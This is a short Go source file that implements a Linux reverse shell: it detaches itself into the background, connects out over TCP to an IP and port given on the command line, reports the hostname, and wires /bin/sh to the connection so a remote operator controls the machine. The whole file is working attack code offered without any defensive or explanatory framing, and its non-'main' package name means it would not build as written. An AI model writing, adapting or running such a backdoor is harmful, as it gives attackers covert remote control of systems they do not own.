package oGllehS_Linux

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	// Ensure correct number of arguments
	if len(os.Args) != 3 {
		fmt.Println("Usage: ./program <serverIP> <serverPort>")
		os.Exit(1)
	}

	// Check if already running in the background
	if os.Getenv("IS_BACKGROUND") != "1" {
		// Fork and detach the process
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Env = append(os.Environ(), "IS_BACKGROUND=1")
		cmd.Stdin = nil
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.Start()
		os.Exit(0)
	}

	// Parse arguments
	serverIP := os.Args[1]
	serverPort := os.Args[2]
	address := fmt.Sprintf("%s:%s", serverIP, serverPort)

	// Connect to the server
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error connecting to server: %v\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	// Determine the shell
	shell := "/bin/sh" // Default shell for Linux

	// Create the command to execute the shell
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start the shell process
	if err := cmd.Run(); err != nil {
		fmt.Printf("Error starting shell: %v\n", err)
	}

	fmt.Printf("Connected to server at %s\n", address)
}
